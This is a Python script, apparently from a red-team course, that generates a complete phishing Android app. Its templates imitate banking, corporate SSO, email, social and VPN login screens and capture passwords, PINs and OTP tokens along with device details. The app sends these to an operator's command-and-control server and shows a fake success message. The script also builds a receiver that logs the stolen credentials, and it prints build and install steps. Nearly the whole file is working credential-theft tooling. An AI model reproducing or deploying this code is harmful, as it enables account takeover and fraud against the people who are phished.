#!/usr/bin/env python3
"""
android-phish-apk.py — Generate a phishing APK that mimics a legitimate app's
login screen, captures credentials, and forwards them to a C2 server.
Builds using Kivy + Buildozer for cross-architecture support.

Usage:
    python3 android-phish-apk.py --target <app_name> --c2 <host:port> [--output DIR]
    python3 android-phish-apk.py --template banking --c2 10.10.14.5:8443

Templates: banking, corporate, social, email, vpn

Part of: Red Team Academy — Android Tools
"""

import argparse
import os
import sys
import json
from datetime import datetime

# Login page templates (HTML rendered in WebView or Kivy)
TEMPLATES = {
    "banking": {
        "title": "Secure Banking",
        "icon_color": "#1a5276",
        "fields": ["Account Number", "Password", "PIN"],
        "button_text": "Sign In",
        "logo_text": "Mobile Banking",
        "success_msg": "Authentication successful. Loading your account...",
    },
    "corporate": {
        "title": "Corporate Portal",
        "icon_color": "#2c3e50",
        "fields": ["Email", "Password"],
        "button_text": "Log In",
        "logo_text": "Enterprise SSO",
        "success_msg": "Connecting to corporate network...",
    },
    "social": {
        "title": "Social Connect",
        "icon_color": "#3498db",
        "fields": ["Username or Email", "Password"],
        "button_text": "Log In",
        "logo_text": "Social App",
        "success_msg": "Welcome back! Loading your feed...",
    },
    "email": {
        "title": "Email",
        "icon_color": "#e74c3c",
        "fields": ["Email Address", "Password"],
        "button_text": "Next",
        "logo_text": "Mail",
        "success_msg": "Syncing your inbox...",
    },
    "vpn": {
        "title": "VPN Connect",
        "icon_color": "#27ae60",
        "fields": ["Username", "Password", "OTP Token"],
        "button_text": "Connect",
        "logo_text": "Secure VPN",
        "success_msg": "Establishing secure tunnel...",
    },
}


def generate_main_py(template, c2_host, c2_port):
    """Generate the main.py for the phishing APK."""
    fields_code = ""
    field_names = []
    for field in template["fields"]:
        safe_name = field.lower().replace(" ", "_").replace("/", "_")
        field_names.append(safe_name)
        is_password = "password" in field.lower() or "pin" in field.lower()
        fields_code += f"""
        self.{safe_name}_input = TextInput(
            hint_text="{field}",
            multiline=False,
            password={is_password},
            size_hint_y=None,
            height=dp(48),
            background_color=(0.15, 0.15, 0.2, 1),
            foreground_color=(1, 1, 1, 1),
            hint_text_color=(0.5, 0.5, 0.6, 1),
            padding=[dp(12), dp(12)],
            font_size=sp(16),
        )
        form_layout.add_widget(self.{safe_name}_input)
        form_layout.add_widget(Widget(size_hint_y=None, height=dp(8)))
"""

    collect_code = "{\n"
    for name in field_names:
        collect_code += f'            "{name}": self.{name}_input.text,\n'
    collect_code += "        }"

    return f'''#!/usr/bin/env python3
"""
Generated phishing APK — {template["title"]}
Target template: captures {", ".join(template["fields"])}
C2: {c2_host}:{c2_port}
"""

import socket
import json
import threading
import time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.metrics import dp, sp
from kivy.utils import get_color_from_hex

C2_HOST = "{c2_host}"
C2_PORT = {c2_port}


def send_to_c2(data):
    """Send captured credentials to C2 server."""
    def _send():
        for attempt in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((C2_HOST, C2_PORT))
                sock.send(json.dumps(data).encode() + b"\\n")
                sock.close()
                return
            except Exception:
                time.sleep(5)
    threading.Thread(target=_send, daemon=True).start()


def get_device_info():
    """Gather device info for context."""
    try:
        from jnius import autoclass
        Build = autoclass("android.os.Build")
        return {{
            "model": Build.MODEL,
            "manufacturer": Build.MANUFACTURER,
            "version": Build.VERSION.RELEASE,
        }}
    except Exception:
        return {{"model": "unknown", "platform": "non-android"}}


class PhishApp(App):
    def build(self):
        self.title = "{template["title"]}"

        root = BoxLayout(orientation="vertical", padding=dp(24), spacing=dp(16))
        root.canvas.before.clear()
        from kivy.graphics import Color, Rectangle
        with root.canvas.before:
            Color(0.08, 0.08, 0.12, 1)
            self.bg_rect = Rectangle(pos=root.pos, size=root.size)
        root.bind(pos=self._update_bg, size=self._update_bg)

        # Spacer
        root.add_widget(Widget(size_hint_y=0.15))

        # Logo / title
        root.add_widget(Label(
            text="{template["logo_text"]}",
            font_size=sp(28),
            bold=True,
            color=get_color_from_hex("{template["icon_color"]}"),
            size_hint_y=None,
            height=dp(48),
        ))
        root.add_widget(Widget(size_hint_y=None, height=dp(24)))

        # Form
        form_layout = BoxLayout(orientation="vertical", size_hint_y=None)
        form_layout.bind(minimum_height=form_layout.setter("height"))
{fields_code}
        root.add_widget(form_layout)
        root.add_widget(Widget(size_hint_y=None, height=dp(16)))

        # Submit button
        btn = Button(
            text="{template["button_text"]}",
            size_hint_y=None,
            height=dp(48),
            background_color=get_color_from_hex("{template["icon_color"]}"),
            font_size=sp(18),
            bold=True,
        )
        btn.bind(on_press=self.on_submit)
        root.add_widget(btn)

        # Status label
        self.status = Label(
            text="",
            font_size=sp(14),
            color=(0.5, 0.8, 0.5, 1),
            size_hint_y=None,
            height=dp(32),
        )
        root.add_widget(self.status)
        root.add_widget(Widget(size_hint_y=0.3))

        return root

    def _update_bg(self, instance, value):
        self.bg_rect.pos = instance.pos
        self.bg_rect.size = instance.size

    def on_submit(self, instance):
        creds = {collect_code}
        creds["device"] = get_device_info()
        creds["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%S")
        creds["template"] = "{template["title"]}"

        send_to_c2(creds)
        self.status.text = "{template["success_msg"]}"

        # Simulate loading then close after delay
        def close_app():
            time.sleep(3)
            App.get_running_app().stop()
        threading.Thread(target=close_app, daemon=True).start()


if __name__ == "__main__":
    PhishApp().run()
'''


def generate_buildozer_spec(template, output_dir):
    """Generate buildozer.spec for APK building."""
    safe_name = template["title"].lower().replace(" ", "")
    return f"""[app]
title = {template["title"]}
package.name = {safe_name}
package.domain = com.security
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0.0
requirements = python3,kivy,pyjnius
android.permissions = INTERNET,ACCESS_NETWORK_STATE
android.api = 33
android.minapi = 21
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = False
orientation = portrait
fullscreen = 0
log_level = 2
warn_on_root = 0
"""


def generate_c2_receiver(c2_port):
    """Generate the C2 credential receiver script."""
    return f'''#!/usr/bin/env python3
"""
Credential receiver for phishing APK.
Listens for incoming connections and logs captured credentials.
"""

import socket
import json
import threading
from datetime import datetime

HOST = "0.0.0.0"
PORT = {c2_port}
LOG_FILE = "captured_creds.json"

all_creds = []


def handle_client(conn, addr):
    try:
        data = conn.recv(4096).decode().strip()
        if data:
            creds = json.loads(data)
            creds["source_ip"] = addr[0]
            creds["received_at"] = datetime.now().isoformat()

            all_creds.append(creds)

            # Log to file
            with open(LOG_FILE, "w") as f:
                json.dump(all_creds, f, indent=2)

            print()
            print("=" * 50)
            print(f"[+] CREDENTIALS CAPTURED from {{addr[0]}}")
            print(f"    Time: {{creds.get('timestamp', 'N/A')}}")
            print(f"    Template: {{creds.get('template', 'N/A')}}")
            print(f"    Device: {{creds.get('device', {{}})}}")
            print("-" * 50)
            for key, value in creds.items():
                if key not in ("device", "timestamp", "template", "source_ip", "received_at"):
                    print(f"    {{key}}: {{value}}")
            print("=" * 50)
    except Exception as e:
        print(f"[-] Error: {{e}}")
    finally:
        conn.close()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(10)
    print(f"[*] Phishing C2 Receiver listening on {{HOST}}:{{PORT}}")
    print(f"[*] Credentials will be saved to {{LOG_FILE}}")
    print("[*] Waiting for connections...\\n")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()


if __name__ == "__main__":
    main()
'''


def main():
    parser = argparse.ArgumentParser(
        description="Generate Android Phishing APK"
    )
    parser.add_argument(
        "--template", "-t", required=True,
        choices=list(TEMPLATES.keys()),
        help="Phishing template to use",
    )
    parser.add_argument(
        "--c2", required=True,
        help="C2 server address (host:port)",
    )
    parser.add_argument(
        "--output", "-o", default="./phish_apk",
        help="Output directory",
    )
    args = parser.parse_args()

    # Parse C2 address
    if ":" not in args.c2:
        print("[-] C2 must be in host:port format")
        sys.exit(1)
    c2_host, c2_port = args.c2.rsplit(":", 1)
    c2_port = int(c2_port)

    template = TEMPLATES[args.template]
    print(f"[*] Android Phishing APK Generator — Red Team Academy")
    print(f"[*] Template: {args.template} ({template['title']})")
    print(f"[*] C2: {c2_host}:{c2_port}")
    print(f"[*] Fields: {', '.join(template['fields'])}")

    os.makedirs(args.output, exist_ok=True)

    # Generate main.py
    main_py = generate_main_py(template, c2_host, c2_port)
    main_path = os.path.join(args.output, "main.py")
    with open(main_path, "w") as f:
        f.write(main_py)
    print(f"[+] Generated: {main_path}")

    # Generate buildozer.spec
    spec = generate_buildozer_spec(template, args.output)
    spec_path = os.path.join(args.output, "buildozer.spec")
    with open(spec_path, "w") as f:
        f.write(spec)
    print(f"[+] Generated: {spec_path}")

    # Generate C2 receiver
    c2_script = generate_c2_receiver(c2_port)
    c2_path = os.path.join(args.output, "c2_receiver.py")
    with open(c2_path, "w") as f:
        f.write(c2_script)
    print(f"[+] Generated: {c2_path}")

    print(f"\n[*] Build instructions:")
    print(f"    cd {args.output}")
    print(f"    pip install buildozer cython")
    print(f"    buildozer android debug")
    print(f"\n[*] Start C2 receiver:")
    print(f"    python3 {c2_path}")
    print(f"\n[*] Install APK:")
    print(f"    adb install bin/*.apk")


if __name__ == "__main__":
    main()
'''
